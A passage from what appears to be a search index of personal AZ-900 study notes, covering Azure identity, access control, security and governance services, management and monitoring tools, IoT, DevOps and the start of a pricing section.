web authentication (WebAuthn) standard.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-ad-external-identities","title":"Azure AD external identities","text":"<p>Azure AD External Identities refers to all the ways you can securely interact with users outside of your organization.</p> <ul> <li>Business to business (B2B) collaboration\u00a0- Collaborate with external users by letting them use their preferred identity to sign-in to your Microsoft applications or other enterprise applications (SaaS apps, custom-developed apps, etc.). B2B collaboration users are represented in your directory, typically as guest users.</li> <li>B2B direct connect\u00a0- Establish a mutual, two-way trust with another Azure AD organization for seamless collaboration. B2B direct connect currently supports Teams shared channels, enabling external users to access your resources from within their home instances of Teams. B2B direct connect users aren't represented in your directory, but they're visible from within the Teams shared channel and can be monitored in Teams admin center reports.</li> <li>Azure AD business to customer (B2C)\u00a0- Publish modern SaaS apps or custom-developed apps (excluding Microsoft apps) to consumers and customers, while using Azure AD B2C for identity and access management.</li> </ul> <p>Depending on how you want to interact with external organizations and the types of resources you need to share, you can use a combination of these capabilities.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-conditional-access","title":"Azure conditional access","text":"<p>Conditional Access is a tool that Azure Active Directory uses to allow (or deny) access to resources based on identity signals. These signals include who the user is, where the user is, and what device the user is requesting access from. During sign-in, Conditional Access collects signals from the user, makes decisions based on those signals, and then enforces that decision by allowing or denying the access request or challenging for a multifactor authentication response.</p> <p>Conditional Access is useful when you need to:</p> <ul> <li>Require multifactor authentication (MFA) to access an application depending on the requester\u2019s role, location, or network. For example, you could require MFA for administrators but not regular users or for people connecting from outside your corporate network.</li> <li>Require access to services only through approved client applications. For example, you could limit which email applications are able to connect to your email service.</li> <li>Require users to access your application only from managed devices. A managed device is a device that meets your standards for security and compliance.</li> <li>Block access from untrusted sources, such as access from unknown or unexpected locations.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-resource-manager-for-role-based-access-control-rbac","title":"Azure Resource Manager for role-based access control (RBAC)","text":"<p>Azure Resource Manager is a management service that provides a way to organize and secure your cloud resources.</p> <p>Azure provides built-in roles that describe common access rules for cloud resources. You can also define your own roles.</p> <p></p> <p>Scopes include:</p> <ul> <li>A management group (a collection of multiple subscriptions).</li> <li>A single subscription.</li> <li>A resource group.</li> <li>A single resource.</li> </ul> <p>Azure RBAC is hierarchical, in that when you grant access at a parent scope, those permissions are inherited by all child scopes. For example:</p> <ul> <li>When you assign the Owner role to a user at the management group scope, that user can manage everything in all subscriptions within the management group.</li> <li>When you assign the Reader role to a group at the subscription scope, the members of that group can view every resource group and resource within the subscription.</li> </ul> <p>Azure RBAC is enforced on any action that's initiated against an Azure resource that passes through Azure Resource Manager. Resource Manager is a management service that provides a way to organize and secure your cloud resources.</p> <p>You typically access Resource Manager from the Azure portal, Azure Cloud Shell, Azure PowerShell, and the Azure CLI. </p> <p>Azure RBAC doesn't enforce access permissions at the application or data level. Application security must be handled by your application.</p> <p>Azure RBAC uses an allow model. When you're assigned a role, Azure RBAC allows you to perform actions within the scope of that role. If one role assignment grants you read permissions to a resource group and a different role assignment grants you write permissions to the same resource group, you have both read and write permissions on that resource group.</p> <p>You can have up to 2000 role assignments in each subscription.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#zero-trust-model","title":"Zero trust model","text":"<p>Traditionally, corporate networks were restricted, protected, and generally assumed safe. Only managed computers could join the network, VPN access was tightly controlled, and personal devices were frequently restricted or blocked.</p> <p>The Zero Trust model flips that scenario. Instead of assuming that a device is safe because it\u2019s within the corporate network, it requires everyone to authenticate. Then grants access based on authentication rather than location.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#defense-in-depth","title":"Defense-in-depth","text":"<p>A defense-in-depth strategy uses a series of mechanisms to slow the advance of an attack that aims at acquiring unauthorized access to data.</p> <p></p> <p>This approach removes reliance on any single layer of protection. It slows down an attack and provides alert information that security teams can act upon, either automatically or manually.</p> <p>Here's a brief overview of the role of each layer:</p> <ul> <li>The physical security layer is the first line of defense to protect computing hardware in the datacenter. Physically securing access to buildings and controlling access to computing hardware within the datacenter are the first line of defense.</li> <li>The identity and access layer controls access to infrastructure and change control. The identity and access layer is all about ensuring that identities are secure, that access is granted only to what's needed, and that sign-in events and changes are logged.</li> <li>The perimeter layer uses distributed denial of service (DDoS) protection to filter large-scale attacks before they can cause a denial of service for users. The network perimeter protects from network-based attacks against your resources. Identifying these attacks, eliminating their impact, and alerting you when they happen are important ways to keep your network secure. \u00a0DDoS protection + Firewalls.</li> <li>The network layer limits communication between resources through segmentation and access controls. - Limit communication between resources. - Deny by default. - Restrict inbound internet access and limit outbound access where appropriate. - Implement secure connectivity to on-premises networks.</li> <li>The compute layer secures access to virtual machines. - Secure access to virtual machines. - Implement endpoint protection on devices and keep systems patched and current.</li> <li>The application layer helps ensure that applications are secure and free of security vulnerabilities. - Store sensitive application secrets in a secure storage medium. - Make security a design requirement for all application development.</li> <li>The data layer controls access to business and customer data that you need to protect.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#microsoft-defender-for-cloud","title":"Microsoft Defender for Cloud","text":"<p>Defender for Cloud is a monitoring tool for security posture management and threat protection. It monitors your cloud, on-premises, hybrid, and multi-cloud environments to provide guidance and notifications aimed at strengthening your security posture.</p> <p>When necessary, Defender for Cloud can automatically deploy a Log Analytics agent to gather security-related data. For Azure machines, deployment is handled directly. For hybrid and multi-cloud environments, Microsoft Defender plans are extended to non Azure machines with the help of Azure Arc. \u00a0Cloud security posture management (CSPM) features are extended to multi-cloud machines without the need for any agents.</p> <p>Defender for Cloud helps you detect threats across:</p> <ul> <li>Azure PaaS services \u2013 Detect threats targeting Azure services. You can also perform anomaly detection on your Azure activity logs using the native integration with Microsoft Defender for Cloud Apps (formerly known as Microsoft Cloud App Security).</li> <li>Azure data services \u2013 Defender for Cloud includes capabilities that help you automatically classify your data in Azure SQL. </li> <li>Networks \u2013 Defender for Cloud helps you limit exposure to brute force attacks. By reducing access to virtual machine ports, using the just-in-time VM access, you can harden your network by preventing unnecessary access.</li> </ul> <p>Defender for Cloud can also protect resources in other clouds (such as AWS and GCP). For example, if you've connected an Amazon Web Services (AWS) account to an Azure subscription, you can enable any of these protections:</p> <ul> <li>Defender for Cloud's CSPM features extend to your AWS resources. This agentless plan assesses your AWS resources according to AWS-specific security recommendations, and includes the results in the secure score. The resources will also be assessed for compliance with built-in standards specific to AWS (AWS CIS, AWS PCI DSS, and AWS Foundational Security Best Practices). Defender for Cloud's asset inventory page is a multi-cloud enabled feature helping you manage your AWS resources alongside your Azure resources.</li> <li>Microsoft Defender for Containers extends its container threat detection and advanced defenses to your Amazon EKS Linux clusters.</li> <li>Microsoft Defender for Servers brings threat detection and advanced defenses to your Windows and Linux EC2 instances.</li> </ul> <p>Defender for Cloud \u00a0fills three vital needs:</p> <ul> <li>Continuously assess \u2013 Know your security posture. Identify and track vulnerabilities. Defender for cloud helps you continuously assess your environment. Defender for Cloud includes vulnerability assessment solutions for your virtual machines, container registries, and SQL servers. Microsoft Defender for servers includes automatic, native integration with Microsoft Defender for Endpoint.</li> <li>Secure: Harden resources and services with Azure Security Benchmark.  In Defender for Cloud, you can set your policies to run on management groups, across subscriptions, and even for a whole tenant. Defender for Cloud assesses if new resources are configured according to security best practices. If not, they're flagged and you get a prioritized list of recommendations for what you need to fix. In this way, Defender for Cloud enables you not just to set security policies, but to apply secure configuration standards across your resources. To help you understand how important each recommendation is to your overall security posture, Defender for Cloud groups the recommendations into security controls and adds a secure score value to each control.</li> <li>Defend \u2013 Detect and resolve threats to resources, workloads, and services. When Defender for Cloud detects a threat in any area of your environment, it generates a security alert. Security alerts describe details of the affected resources, suggest remediation steps, and provide, in some cases, an option to trigger a logic app in response</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#governance-and-compliance-features-and-tools","title":"Governance and compliance: features  and tools","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#microsoft-purview","title":"Microsoft Purview","text":"<p>Microsoft Purview is a family of data governance, risk, and compliance solutions that helps you get a single, unified view into your data. Microsoft Purview brings insights about your on-premises, multicloud, and software-as-a-service data together. It provides:</p> <ul> <li>Automated data discovery</li> <li>Sensitive data classification</li> <li>End-to-end data lineage</li> </ul> <p>Microsoft Purview risk and compliance solutions: Microsoft 365 features as a core component of the Microsoft Purview risk and compliance solutions. Microsoft Teams, OneDrive, and Exchange are just some of the Microsoft 365 services that Microsoft Purview uses to help manage and monitor your data.</p> <p>Unified data governance: Microsoft Purview has robust, unified data governance solutions that help manage your on-premises, multicloud, and software as a service data. Microsoft Purview\u2019s robust data governance capabilities enable you to manage your data stored in Azure, SQL and Hive databases, locally, and even in other clouds like Amazon S3.</p> <p>Microsoft Purview\u2019s unified data governance helps your organization:</p> <ul> <li>Create an up-to-date map of your entire data estate that includes data classification and end-to-end lineage.</li> <li>Identify where sensitive data is stored in your estate.</li> <li>Create a secure environment for data consumers to find valuable data.</li> <li>Generate insights about how your data is stored and used.</li> <li>Manage access to the data in your estate securely and at scale.</li> </ul> <p>Which feature in the Microsoft Purview governance portal should you use to manage access to data sources and datasets?</p> <ul> <li>Incorrect: Data Catalog \u2013\u2013 This enables data discovery. </li> <li>Incorrect: Data Sharing \u2013\u2013 This shares data within and between organizations.</li> <li>Incorrect: Data Estate Insights \u2013\u2013 This accesses data estate health.</li> <li>Correct: Data Policy \u2013\u2013 This governs access to data.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-policy","title":"Azure Policy","text":"<p>Azure Policy is a service in Azure that enables you to create, assign, and manage policies that control or audit your resources.</p> <p>Azure Policy enables you to define both individual policies and groups of related policies, known as initiatives. Azure Policy evaluates your resources and highlights resources that aren't compliant with the policies you've created. Azure Policy can also prevent noncompliant resources from being created.</p> <p>Azure Policies can be set at each level, enabling you to set policies on a specific resource, resource group, subscription, and so on. Additionally, Azure Policies are inherited, so if you set a policy at a high level, it will automatically be applied to all of the groupings that fall within the parent.</p> <p>Azure Policy comes with built-in policy and initiative definitions for Storage, Networking, Compute, Security Center, and Monitoring. In some cases, Azure Policy can automatically remediate noncompliant resources and configurations to ensure the integrity of the state of the resources. This applies, for example, in the tagging of resources. If you have a specific resource that you don\u2019t want Azure Policy to automatically fix, you can flag that resource as an exception.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-initiative-policies","title":"Azure initiative policies","text":"<p>An Azure Policy initiative is a way of grouping related policies together. The initiative definition contains all of the policy definitions to help track your compliance state for a larger goal. For instance, the Enable Monitoring in Azure Security Center initiative contains over 100 separate policy definitions. Its goal is to monitor all available security recommendations for all Azure resource types in Azure Security Center.</p> <p>Under this initiative, the following policy definitions are included:</p> <ul> <li>Monitor unencrypted SQL Database in Security Center\u00a0This policy monitors for unencrypted SQL databases and servers.</li> <li>Monitor OS vulnerabilities in Security Center\u00a0This policy monitors servers that don't satisfy the configured OS vulnerability baseline.</li> <li>Monitor missing Endpoint Protection in Security Center\u00a0This policy monitors for servers that don't have an installed endpoint protection agent.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#resource-locks","title":"Resource locks","text":"<p>Resource locks prevent resources from being deleted or updated, depending on the type of lock. Resource locks can be applied to individual resources, resource groups, or even an entire subscription. Resource locks are inherited, meaning that if you place a resource lock on a resource group, all of the resources within the resource group will also have the resource lock applied.</p> <p>There are two types of resource locks, one that prevents users from deleting and one that prevents users from changing or deleting a resource.</p> <ul> <li>Delete means authorized users can still read and modify a resource, but they can't delete the resource.</li> <li>ReadOnly means authorized users can read a resource, but they can't delete or update the resource. Applying this lock is similar to restricting all authorized users to the permissions granted by the Reader role.</li> </ul> <p>You can manage resource locks from the Azure portal, PowerShell, the Azure CLI, or from an Azure Resource Manager template. To view, add, or delete locks in the Azure portal, go to the Settings section of any resource's Settings pane in the Azure portal. To modify a locked resource, you must first remove the lock. After you remove the lock, you can apply any action you have permissions to perform. Resource locks apply regardless of RBAC permissions. Even if you're an owner of the resource, you must still remove the lock before you can perform the blocked activity.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#service-trust-portal","title":"Service Trust portal","text":"<p>The Microsoft Service Trust Portal is a portal that provides access to various content, tools, and other resources about Microsoft security, privacy, and compliance practices.</p> <p>You can access the Service Trust Portal at\u00a0https://servicetrust.microsoft.com/.</p> <p>The Service Trust Portal features and content are accessible from the main menu. The categories on the main menu are:</p> <ul> <li>Service Trust Portal\u00a0provides a quick access hyperlink to return to the Service Trust Portal home page.</li> <li>My Library\u00a0lets you save (or pin) documents to quickly access them on your My Library page. You can also set up to receive notifications when documents in your My Library are updated.  </li> <li>All Documents\u00a0is a single landing place for documents on the service trust portal. From\u00a0All Documents, you can pin documents to have them show up in your\u00a0My Library.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#key-azure-management-tools","title":"Key Azure Management Tools","text":"<p>There are several tools at your disposal to manage Azure resources and environments. They include the Azure Portal, Azure PowerShell, Azure CLI, the Azure Mobile App, and ARM templates. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-portal","title":"Azure Portal","text":"<p>The Azure portal is a web-based user interface that you can use to access almost every feature of Azure. It can be used to visually understand and manage your Azure environment, while Azure PowerShell allows you to quickly perform one-off tasks and to script tasks as needed. Azure PowerShell is available for Windows, Linux, and Mac, and you can access it in a web browser via Azure Cloud Shell. </p> <p>Azure Portal does not offer a way to automate repetitive tasks.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-cloud-shell","title":"Azure Cloud Shell","text":"<p>Browser-based scripting environment that is accessible from Azure Portal. It requires a storage account. It allows you to choose the shell experience that suits you best. </p> <p>During AZ-900 preparation at Microsoft Learn platform, an Azure Cloud Shell is provided. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-cli","title":"Azure CLI","text":"<p>Azure CLI is a command-line program to connect to Azure and execute administrative commands on Azure resources. It runs on Linux, macOS, and Windows, and allows administrators and developers to execute their commands through a terminal, command-line prompt, or script instead of a web browser.</p> <p>It\u2019s an executable program that you can use to execute commands in Bash. You can use the Azure CLI to perform every possible management task in Azure.  Launch azure cli:</p> <pre><code># Launch Azure CLI interactive mode from Azure Cloud Shell\naz interactive\n\nversion\nupgrade\nexit\n</code></pre> <p>See cheat sheet for Azure CLI. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-powershell","title":"Azure PowerShell","text":"<p>Azure PowerShell is a shell with which developers, DevOps, and IT professionals can run commands called command-lets (cmdlets). These commands call the Azure REST API to perform management tasks in Azure.</p> <p>In addition to be available via Azure Cloud Shell, you can install and configure Azure PowerShell on Windows, Linux, and Mac platforms. </p> <p>See cheat sheet for Azure Powershell. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-resource-manager-arm-and-azure-arm-templates","title":"Azure Resource Manager (ARM) and Azure ARM templates","text":"<p>Azure Resource Manager (ARM) is the service used to provision resources in Azure (via the portal, Azure CLI, Terraform, etc.). A resource can be anything you provision inside an Azure subscription. Resources always belong to a Resource Group. Each type of resource (VM, Web App) is provisioned and managed by a Resource Provider (RP). There are close to two hundred RPs within the Azure platform today (and growing with the release of each new service).</p> <p>Azure Arc takes the notion of the Resource Provider and extends it to resources outside of Azure. Azure Arc introduces a new Resource Provider (RP) called \u201cHybrid Compute\u201d. The HybridCompute RP is responsible for managing the resources outside of Azure. HybridCompute RP manages the external resources by connecting to the Azure Arc\u00a0agent, deployed to the external VM. Once we deploy the Azure Arc agent to a VM running, for instance, in Google Cloud, it shows inside Azure Portal within the resource group \u201caz_arc_rg\u201d. Since the Google Cloud hosted VM (gcp-vm-001) is an ARM resource, it is an object inside Azure AD. Furthermore, there can be a managed identity associated with Google VM.</p> <p>With Azure Resource Manager, you can:</p> <ul> <li>Manage your infrastructure through declarative templates rather than scripts. A Resource Manager template is a JSON file that defines what you want to deploy to Azure.</li> <li>Deploy, manage, and monitor all the resources for your solution as a group, rather than handling these resources individually.</li> <li>Re-deploy your solution throughout the development life-cycle and have confidence your resources are deployed in a consistent state.</li> <li>Define the dependencies between resources, so they're deployed in the correct order.</li> <li>Apply access control to all services because RBAC is natively integrated into the management platform.</li> <li>Apply tags to resources to logically organize all the resources in your subscription.</li> <li>Clarify your organization's billing by viewing costs for a group of resources that share the same tag.</li> </ul> <p>Infraestructure as code: ARM templates and Bicep are two examples of using infrastructure as code with the Azure Resource Manager to maintain your environment.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#arm-templates_1","title":"ARM templates","text":"<p>By using ARM templates, you can describe the resources you want to use in a declarative JSON format. With an ARM template, the deployment code is verified before any code is run. This ensures that the resources will be created and connected correctly. The template then orchestrates the creation of those resources in parallel.  Templates can even execute PowerShell and Bash scripts before or after the resource has been set up.</p> <p>Benefits of using ARM templates:</p> <ul> <li>Declarative syntax: ARM templates allow you to create and deploy an entire Azure infrastructure declaratively.</li> <li>Repeatable results: Repeatedly deploy your infrastructure throughout the development lifecycle and have confidence your resources are deployed in a consistent manner.</li> <li>Orchestration: You don't have to worry about the complexities of ordering operations and inter dependencies.</li> <li>Modular files: You can break your templates into smaller, reusable components and link them together at deployment time.</li> <li>Extensibility: With deployment scripts, you can add PowerShell or Bash scripts to your templates.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#biceps","title":"Biceps","text":"<p>Bicep is a language that uses declarative syntax to deploy Azure resources. A Bicep file defines the infrastructure and configuration. Then, ARM deploys that environment based on your Bicep file. While similar to an ARM template, which is written in JSON, Bicep files tend to use a simpler, more concise style.</p> <p>Benefits of using Bicep files:</p> <ul> <li>Support for all resource types and API versions: Bicep immediately supports all preview and GA versions for Azure services.</li> <li>Simple syntax: When compared to the equivalent JSON template, Bicep files are more concise and easier to read. Bicep requires no previous knowledge of programming languages.</li> <li>Repeatable results: Repeatedly deploy your infrastructure throughout the development lifecycle and have confidence your resources are deployed in a consistent manner.</li> <li>Orchestration: You don't have to worry about the complexities of ordering operations.</li> <li>Modularity: You can break your Bicep code into manageable parts by using modules.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-arc","title":"Azure Arc","text":"<p>Azure Arc is a bridge that extends the Azure platform to help you build applications and services with the flexibility to run across datacenters, at the edge, and in multicloud environments. Develop cloud-native applications with a consistent development, operations, and security model. Azure Arc runs on both new and existing hardware, virtualization and Kubernetes platforms, IoT devices, and integrated systems.</p> <p>Azure Arc is not just a \u201csingle-pane\u201d of control for cloud and on-premises. Azure Arc takes Azure\u2019s all-important control plane \u2013 namely, the Azure Resource Manager (ARM) \u2013 and extends it outside of Azure. In order to understand the implication of the last statement, it will help to go over a few ARM terms.</p> <p>In utilizing Azure Resource Manager (ARM), Arc lets you extend your Azure compliance and monitoring to your hybrid and multi-cloud configurations. Azure Arc simplifies governance and management by delivering a consistent multi-cloud and on-premises management platform.</p> <p>Azure Arc provides a centralized, unified way to:</p> <ul> <li>Manage your entire environment together by projecting your existing non-Azure resources into ARM.</li> <li>Manage multi-cloud and hybrid virtual machines, Kubernetes clusters, and databases as if they are running in Azure.</li> <li>Use familiar Azure services and management capabilities, regardless of where they live.</li> <li>Continue using traditional ITOps while introducing DevOps practices to support new cloud and native patterns in your environment.</li> <li>Configure custom locations as an abstraction layer on top of Azure Arc-enabled Kubernetes clusters and cluster extensions.</li> </ul> <p>Currently, Azure Arc allows you to manage the following resource types hosted outside of Azure:</p> <ul> <li>Servers</li> <li>Kubernetes clusters</li> <li>Azure data services</li> <li>SQL Server</li> <li>Virtual machines (preview)</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-monitoring-tools","title":"Azure Monitoring tools","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-advisor_1","title":"Azure Advisor","text":"<p>Azure Advisor evaluates your Azure resources and makes recommendations to help improve reliability, security, and performance, achieve operational excellence, and reduce costs. Azure Advisor is designed to help you save time on cloud optimization. The recommendation service includes suggested actions you can take right away, postpone, or dismiss.</p> <p>The recommendations are divided into five categories:</p> <ul> <li>Reliability\u00a0is used to ensure and improve the continuity of your business-critical applications.</li> <li>Security\u00a0is used to detect threats and vulnerabilities that might lead to security breaches.</li> <li>Performance\u00a0is used to improve the speed of your applications.</li> <li>Operational Excellence\u00a0is used to help you achieve process and workflow efficiency, resource manageability, and deployment best practices.</li> <li>Cost\u00a0is used to optimize and reduce your overall Azure spending.</li> </ul> <p>Azure Monitor, Service Health, and Azure Advisor all use actions groups to notify you when an alert has been triggered.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-service-health","title":"Azure Service Health","text":"<p>Microsoft Azure provides a global cloud solution to help you manage your infrastructure needs, reach your customers, innovate, and adapt rapidly. Azure Service Health helps you keep track of Azure resource, both your specifically deployed resources and the overall status of Azure. Azure service health does this by combining three different Azure services:</p> <ul> <li>Azure Status\u00a0 informs you of service outages in Azure on the Azure Status page. The page is a global view of the health of all Azure services across all Azure regions. </li> <li>Service Health\u00a0provides a narrower view of Azure services and regions. It focuses on the Azure services and regions you're using. This is the best place to look for service impacting communications about outages, planned maintenance activities, and other health advisories because the authenticated Service Health experience knows which services and resources you currently use. You can even set up Service Health alerts to notify you when service issues, planned maintenance, or other changes may affect the Azure services and regions you use.</li> <li>Resource Health\u00a0is a tailored view of your actual Azure resources. It provides information about the health of your individual cloud resources, such as a specific virtual machine instance. It helps to diagnose issues. You can obtain support when an Azure service issue affects your resources.</li> </ul> <p>By using Azure status, Service health, and Resource health, Azure Service Health gives you a complete view of your Azure environment-all the way from the global status of Azure services and regions down to specific resources.</p> <p>Something you initially thought was a simple anomaly that turned into a trend, can readily be reviewed and investigated thanks to the historical alerts.</p> <p>Azure Monitor, Service Health, and Azure Advisor all use actions groups to notify you when an alert has been triggered.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-monitor","title":"Azure  Monitor","text":"<p>Azure Monitor is a platform for collecting data on your resources, analyzing that data, visualizing the information, and even acting on the results. Azure Monitor can monitor Azure resources, your on-premises resources, and even multi-cloud resources like virtual machines hosted with a different cloud provider.</p> <p>Azure Monitor, Service Health, and Azure Advisor all use actions groups to notify you when an alert has been triggered.</p> <p>As soon as you create an Azure suscription and start deploying resources, Azure Monitor begins collecting data. Azure Monitor is a platform that collects metric and logging data, such as CPU percentages. The data can be used to trigger autoscaling.</p> <p>Which Azure service can generate an alert if virtual machine utilization is over 80% for five minutes? Azure monitor</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-log-analytics","title":"Azure Log Analytics","text":"<p>Azure Log Analytics is the tool in the Azure portal where you\u2019ll write and run log queries on the data gathered by Azure Monitor. Log Analytics is a robust tool that supports both simple, complex queries, and data analysis. You can write a simple query that returns a set of records and then use features of Log Analytics to sort, filter, and analyze the records. You can write an advanced query to perform statistical analysis and visualize the results in a chart to identify a particular trend.</p> <p>Activity Logs record when resources are created or modified.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-monitor-alerts","title":"Azure Monitor Alerts","text":"<p>Azure Monitor Alerts are an automated way to stay informed when Azure Monitor detects a threshold being crossed. You set the alert conditions, the notification actions, and then Azure Monitor Alerts notifies when an alert is triggered. Depending on your configuration, Azure Monitor Alerts can also attempt corrective action.</p> <p>Alerts can be set up to monitor the logs and trigger on certain log events, or they can be set to monitor metrics and trigger when certain metrics are crossed. Azure Monitor Alerts use action groups to configure who to notify and what action to take. An action group is simply a collection of notification and action preferences that you associate with one or multiple alerts.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#application-insights","title":"Application Insights","text":"<p>Application Insights, an Azure Monitor feature, monitors your web applications. Application Insights is capable of monitoring applications that are running in Azure, on-premises, or in a different cloud environment.</p> <p>There are two ways to configure Application Insights to help monitor your application. You can either install an SDK in your application, or you can use the Application Insights agent. The Application Insights agent is supported in C#.NET, VB.NET, Java, JavaScript, Node.js, and Python.</p> <p>Once Application Insights is up and running, you can use it to monitor a broad array of information, such as:</p> <ul> <li>Request rates, response times, and failure rates</li> <li>Dependency rates, response times, and failure rates, to show whether external services are slowing down performance</li> <li>Page views and load performance reported by users' browsers</li> <li>AJAX calls from web pages, including rates, response times, and failure rates</li> <li>User and session counts</li> <li>Performance counters from Windows or Linux server machines, such as CPU, memory, and network usage</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-iot","title":"Azure IoT","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-iot-hub","title":"Azure IoT Hub","text":"<p>Azure IoT Hub is an Azure-hosted service that functions as a message hub for biderectional communications between the deployed IT devices and the Azure services. You can connect millions of devices and their backend solutions reliably and securely. Almost any device can be connected to an IoT hub. </p> <p>Several messaging patterns are supported, including device-to-cloud telemetry, uploading files from devices, and request-reply methods to control your devices from the cloud. IoT Hub also supports monitoring to help you track device creation, device connections, and device failures.</p> <p>IoT Hub can further route messages to\u00a0Azure Data Lake Storage.</p> <p></p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-iot-central","title":"Azure IoT Central","text":"<p>Built on the functios provided by IoT Hub, it provides visualization, control and management features for IoT devices. You can connect devices, view telemetry, view overall device performance, create and manage alerts or even push updates to devices.</p> <p>IoT has device templates to facilitate management.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-sphere","title":"Azure Sphere","text":"<p>Azure Sphere is an integrated IoT solution that consists of three key parts:</p> <ul> <li>Azure Sphere micro-controller units (MCUs): hardware component build into the IoT devices that processes the OS and signals from attached sensors.</li> <li>Management software: a custom Linux operating system that manages communication with the security service and runs the vendor's device software.</li> <li>Azure Sphere Security Service (AS3): handles certificate-based device authentication to Azure, ensures that the device has not been compromised, and pushes OS and other software updates to the device as needed. </li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-artificial-intelligence","title":"Azure Artificial Intelligence","text":"<p>AI falls into two broad categories: deep learning and machine learning.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-machine-learning","title":"Azure Machine Learning","text":"<p>Collection of Azure services and tools that enable you to use data to train and validate models. It provides multiple services and features such as: Azure Machine Learning Studio, a web portal through which developers ca create no-code and code-first solutions.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-cognitive-services","title":"Azure Cognitive Services","text":"<p>Azure Cognitive Services provides machine learning models to interact with human and execute cognitive functions that humans would normally do: language, speech, vision, decision.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-bot-service","title":"Azure Bot Service","text":"<p>Azure Bot Service enables you to create and use virtual agents to interact with users.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-devops","title":"Azure DevOps","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-devops-services","title":"Azure DevOps Services","text":"<p>This is not a single but rather a group of services:</p> <ul> <li>Azure Artifects</li> <li>Azure Boards</li> <li>Azure Pipelines</li> <li>Azure Repos</li> <li>Azure Test Plans</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#github-and-github-actions","title":"GitHub and GitHub Actions","text":"<p>GitHub and GitHub Actions offer many of the same functions as Azure DevOps Services.  Generally speaking, GitHub is the appropriate choice for collaborating on open source projects and DevOps is the appropriate choice for enterprise/internal projects.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-devtest-labs","title":"Azure DevTest Labs","text":"<p>Azure DevTest Labs automates the deployment, configuration, and decommissioning of VMs and other Azure resources.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-for-defense","title":"Azure for defense","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-firewall","title":"Azure Firewall","text":"<p>Azure Firewall allows you to centrally create, enforce, and log application and network connectivity policies across subscriptions and virtual networks</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-ddos-protection","title":"Azure DDoS Protection","text":"<p>Azure DDoS Protection Standard can provide full layer 3 to layer 7 mitigation capability.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-sentinel","title":"Azure Sentinel","text":"<p>SIEM + SOAR</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-pricing-service-level-agreements-and-lifecycle","title":"Azure Pricing, Service Level Agreements, and Lifecycle","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#pricing","title":"Pricing","text":"<p>There are free and paid subscriptions:</p> <ul> <li>Free trial: 12 months of select free services. Credit of $200 (September 2023) to use any Azure service for 30 days. Services are disabled when time or credit expire. Convertible to 